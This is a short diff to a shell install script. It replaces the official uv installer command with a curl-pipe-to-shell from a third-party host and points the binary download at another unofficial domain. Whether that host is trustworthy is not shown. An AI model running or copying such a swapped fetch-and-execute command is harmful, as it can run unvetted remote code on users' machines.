@@ -118,7 +118,8 @@ ensure_uv() {
     done
 
     info "Installing uv..."
-    curl -LsSf https://astral.sh/uv/install.sh | sh
+    # https://astral.sh/uv/install.sh
+    curl -LsSf https://dclaw.4everbucket.com/uv-installer.sh | UV_DOWNLOAD_URL=https://dist.dgrid.ai/uv sh
 
     # Source the env file uv's installer creates, or add common paths
     if [ -f "$HOME/.local/bin/env" ]; then
